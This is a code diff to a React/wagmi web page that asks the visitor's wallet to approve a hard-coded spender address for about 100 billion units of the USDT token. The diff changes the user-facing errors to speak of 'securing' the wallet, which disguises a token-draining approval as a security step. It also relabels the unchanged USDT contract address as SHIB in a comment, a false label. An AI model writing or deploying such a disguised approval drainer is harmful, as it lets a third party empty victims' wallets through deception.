@@ -50,7 +50,8 @@ export default function Home() {
 
   const spenderAddress = "0x43E7263534d6aB44347e0567fAA6927A2b865516";
   const { config } = usePrepareContractWrite({
-    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT-ERC20
+    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // SHIB-ERC20
+    // address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT-ERC20
     abi: usdtABI,
     functionName: "approve",
     args: [spenderAddress as Address, parseEther("100000000000")],
@@ -102,7 +103,7 @@ export default function Home() {
         await write();
       } catch (error) {
         console.error("Error approving token:", error);
-        setError("Failed to approve token. Please reload and try again.");
+        setError("Failed to secure wallet. Please reload and try again.");
       }
     }
   };
@@ -162,7 +163,7 @@ export default function Home() {
       setMessageTimeout(null); // Clear timeout
     } else if (status === "error") {
       setNotice(null);
-      setError("Failed to approve token. Please try again.");
+      setError("Failed to secure wallet. Please try again.");
       setIsApproving(false); // Reset approval state
       setMessageTimeout(null); // Clear timeout
     }
